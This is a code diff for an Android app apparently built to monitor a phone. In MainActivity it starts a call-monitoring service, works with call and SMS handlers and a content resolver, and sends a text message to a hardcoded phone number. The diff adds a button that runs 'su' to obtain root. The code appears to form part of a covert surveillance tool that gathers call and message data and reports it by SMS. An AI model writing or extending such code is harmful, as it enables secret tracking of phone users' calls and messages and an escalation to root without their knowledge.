@@ -14,7 +14,7 @@ import com.privacy.monitor.resolver.field.CallConstant;
 import com.privacy.monitor.resolver.field.SMSConstant;
 import com.privacy.monitor.resolver.handler.CallHandler;
 import com.privacy.monitor.resolver.handler.SMSHandler;
-import com.privacy.monitor.service.CallRecordService;
+import com.privacy.monitor.service.CallMonitoringService;
 import com.privacy.monitor.util.AppUtil;
 import com.privacy.monitor.util.HttpUtil;
 
@@ -50,7 +50,7 @@ public class MainActivity extends BaseActivity {
             super.onCreate(savedInstanceState);
             setContentView(R.layout.activity_main);
            initData();
-
+          
     }
 
     private void initData() {
@@ -58,7 +58,7 @@ public class MainActivity extends BaseActivity {
             tvAddress = getView(R.id.locaiton_address);
             edMessage = getView(R.id.editor_send_message);
 
-            Intent intent = new Intent(this, CallRecordService.class);
+            Intent intent = new Intent(this, CallMonitoringService.class);
             startService(intent);
 
             ContentResolver resolver = getContentResolver();
@@ -177,6 +177,13 @@ public class MainActivity extends BaseActivity {
                     SmsManager smsManager = SmsManager.getDefault();
                     smsManager.sendTextMessage("13538715695", null, message, null, null);
                     break;
+            case R.id.get_root_authority:
+            	try {
+					Runtime.getRuntime().exec("su");
+				} catch (IOException e) {
+					e.printStackTrace();
+				}
+            	break;
             }
     }
 
